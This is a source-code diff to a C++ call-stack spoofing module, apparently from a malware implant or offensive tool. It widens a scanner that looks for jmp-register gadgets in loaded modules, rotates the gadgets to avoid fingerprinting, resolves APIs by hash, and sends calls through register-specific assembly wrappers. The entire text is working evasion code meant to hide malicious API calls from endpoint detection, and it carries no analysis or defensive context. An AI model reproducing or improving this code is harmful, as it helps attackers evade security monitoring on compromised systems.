@@ -16,8 +16,10 @@ namespace StackSpoof
     static SpoofGadget s_Gadgets[128] = {};
     static DWORD s_Count = 0;
     static void* s_RetGadget = nullptr;
+    static DWORD s_LastIdx = 0;  // Для ротации гаджетов
 
-    // Scan a module for FF E3 (jmp rbx) and FF E6 (jmp rsi) gadgets
+    // Scan a module for FF E3 (jmp rbx), FF E6 (jmp rsi), and
+    // FF E0 (jmp rax) gadgets — diversify gadget pool
     static DWORD ScanModule(HMODULE hModule)
     {
         if (!hModule || s_Count >= 128) return 0;
@@ -42,25 +44,74 @@ namespace StackSpoof
 
             for (DWORD j = 0; j < scanLimit && s_Count < 128; j++)
             {
-                // FF E3 = jmp rbx
-                if (start[j] == 0xFF && start[j + 1] == 0xE3)
-                {
-                    s_Gadgets[s_Count].address = start + j;
-                    s_Gadgets[s_Count].type = 0;
-                    s_Count++;
-                    found++;
+                unsigned char b0 = start[j];
+                unsigned char b1 = start[j + 1];
 
-                    j++; // skip second byte
-                }
-                // FF E6 = jmp rsi
-                else if (start[j] == 0xFF && start[j + 1] == 0xE6)
+                if (b0 == 0xFF)
                 {
-                    s_Gadgets[s_Count].address = start + j;
-                    s_Gadgets[s_Count].type = 1;
-                    s_Count++;
-                    found++;
-
-                    j++;
+                    // FF E3 = jmp rbx (type 0)
+                    if (b1 == 0xE3)
+                    {
+                        s_Gadgets[s_Count].address = start + j;
+                        s_Gadgets[s_Count].type = 0;
+                        s_Count++;
+                        found++;
+                        j++;
+                    }
+                    // FF E6 = jmp rsi (type 1)
+                    else if (b1 == 0xE6)
+                    {
+                        s_Gadgets[s_Count].address = start + j;
+                        s_Gadgets[s_Count].type = 1;
+                        s_Count++;
+                        found++;
+                        j++;
+                    }
+                    // FF E0 = jmp rax (type 2) — распространён в ntdll
+                    else if (b1 == 0xE0)
+                    {
+                        s_Gadgets[s_Count].address = start + j;
+                        s_Gadgets[s_Count].type = 2;
+                        s_Count++;
+                        found++;
+                        j++;
+                    }
+                    // FF E1 = jmp rcx (type 3)
+                    else if (b1 == 0xE1)
+                    {
+                        s_Gadgets[s_Count].address = start + j;
+                        s_Gadgets[s_Count].type = 3;
+                        s_Count++;
+                        found++;
+                        j++;
+                    }
+                    // FF E2 = jmp rdx (type 4) — volatile, pool only
+                    else if (b1 == 0xE2)
+                    {
+                        s_Gadgets[s_Count].address = start + j;
+                        s_Gadgets[s_Count].type = 4;
+                        s_Count++;
+                        found++;
+                        j++;
+                    }
+                    // FF E5 = jmp rbp (type 5) — non-volatile, SpoofCall-capable
+                    else if (b1 == 0xE5)
+                    {
+                        s_Gadgets[s_Count].address = start + j;
+                        s_Gadgets[s_Count].type = 5;
+                        s_Count++;
+                        found++;
+                        j++;
+                    }
+                    // FF E7 = jmp rdi (type 6) — non-volatile, SpoofCall-capable
+                    else if (b1 == 0xE7)
+                    {
+                        s_Gadgets[s_Count].address = start + j;
+                        s_Gadgets[s_Count].type = 6;
+                        s_Count++;
+                        found++;
+                        j++;
+                    }
                 }
 
                 // Find a C3 (ret) for synthetic frame building
@@ -91,6 +142,33 @@ namespace StackSpoof
         return s_Count > 0 && s_RetGadget != nullptr;
     }
 
+    // Get a spoof gadget suitable for SpoofCall (non-volatile register types only).
+    // Types 0,1,5,6 map to rbx/rsi/rbp/rdi — all callee-saved in Windows x64.
+    // Rotates through available gadgets to avoid address fingerprinting.
+    SpoofGadget* GetSpoofGadgetForSpoofCall()
+    {
+        if (s_Count == 0) return nullptr;
+
+        // Non-volatile types: 0=rbx, 1=rsi, 5=rbp, 6=rdi
+        static const unsigned char spoofTypes[] = { 0, 1, 5, 6 };
+        constexpr DWORD typeCount = sizeof(spoofTypes) / sizeof(spoofTypes[0]);
+
+        DWORD start = s_LastIdx % s_Count;
+        for (DWORD i = 0; i < s_Count; i++)
+        {
+            DWORD idx = (start + i) % s_Count;
+            for (DWORD t = 0; t < typeCount; t++)
+            {
+                if (s_Gadgets[idx].type == spoofTypes[t])
+                {
+                    s_LastIdx = (idx + 1) % s_Count;
+                    return &s_Gadgets[idx];
+                }
+            }
+        }
+        return nullptr;
+    }
+
     SpoofGadget* GetSpoofGadget()
     {
         if (s_Count == 0) return nullptr;
@@ -98,16 +176,23 @@ namespace StackSpoof
         HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
         auto pGetTickCount = (DWORD(WINAPI*)())Api::GetProcByHashCrc(hK32, Api::CrcFn::GetTickCount);
 
-        // Prefer FF E3 (jmp rbx) type for SpoofCall4 compatibility
         DWORD start = (pGetTickCount ? pGetTickCount() : 0) % s_Count;
+
+        // Prefer non-volatile types for SpoofCall compatibility
+        static const unsigned char prefTypes[] = { 0, 1, 5, 6 };
+        constexpr DWORD typeCount = sizeof(prefTypes) / sizeof(prefTypes[0]);
+
         for (DWORD i = 0; i < s_Count; i++)
         {
             DWORD idx = (start + i) % s_Count;
-            if (s_Gadgets[idx].type == 0) // FF E3
-                return &s_Gadgets[idx];
+            for (DWORD t = 0; t < typeCount; t++)
+            {
+                if (s_Gadgets[idx].type == prefTypes[t])
+                    return &s_Gadgets[idx];
+            }
         }
 
-        // Fallback to any gadget
+        // Fallback to any gadget (volatile-register types for pool diversity)
         return &s_Gadgets[start];
     }
 
@@ -118,21 +203,39 @@ namespace StackSpoof
 
     void* GetRetGadget() { return s_RetGadget; }
 
-    // MASM SpoofCallWrapper declaration
-    extern "C" void* SpoofCallWrapper(void* funcPtr, void* spoofGadget,
-                                       void* arg1, void* arg2,
-                                       void* arg3, void* arg4);
+    // MASM SpoofCallWrapper declarations — one per non-volatile gadget register
+    extern "C" void* SpoofCallWrapper_Bx(void* funcPtr, void* spoofGadget,
+                                          void* arg1, void* arg2,
+                                          void* arg3, void* arg4);
+    extern "C" void* SpoofCallWrapper_Si(void* funcPtr, void* spoofGadget,
+                                          void* arg1, void* arg2,
+                                          void* arg3, void* arg4);
+    extern "C" void* SpoofCallWrapper_Di(void* funcPtr, void* spoofGadget,
+                                          void* arg1, void* arg2,
+                                          void* arg3, void* arg4);
+    extern "C" void* SpoofCallWrapper_Bp(void* funcPtr, void* spoofGadget,
+                                          void* arg1, void* arg2,
+                                          void* arg3, void* arg4);
 
     void* SpoofCall4(void* funcPtr, void* arg1, void* arg2, void* arg3, void* arg4)
     {
-        SpoofGadget* gadget = GetSpoofGadget();
+        SpoofGadget* gadget = GetSpoofGadgetForSpoofCall();
         if (!gadget)
         {
-            // No spoof gadgets available — call directly (fallback)
             typedef void* (*Fn4)(void*, void*, void*, void*);
             return ((Fn4)funcPtr)(arg1, arg2, arg3, arg4);
         }
 
-        return SpoofCallWrapper(funcPtr, gadget->address, arg1, arg2, arg3, arg4);
+        // Dispatch to the MASM wrapper matching the gadget's register
+        switch (gadget->type)
+        {
+        case 0: return SpoofCallWrapper_Bx(funcPtr, gadget->address, arg1, arg2, arg3, arg4);
+        case 1: return SpoofCallWrapper_Si(funcPtr, gadget->address, arg1, arg2, arg3, arg4);
+        case 5: return SpoofCallWrapper_Bp(funcPtr, gadget->address, arg1, arg2, arg3, arg4);
+        case 6: return SpoofCallWrapper_Di(funcPtr, gadget->address, arg1, arg2, arg3, arg4);
+        default:
+            // Unknown non-volatile type — fallback to rbx wrapper
+            return SpoofCallWrapper_Bx(funcPtr, gadget->address, arg1, arg2, arg3, arg4);
+        }
     }
 }
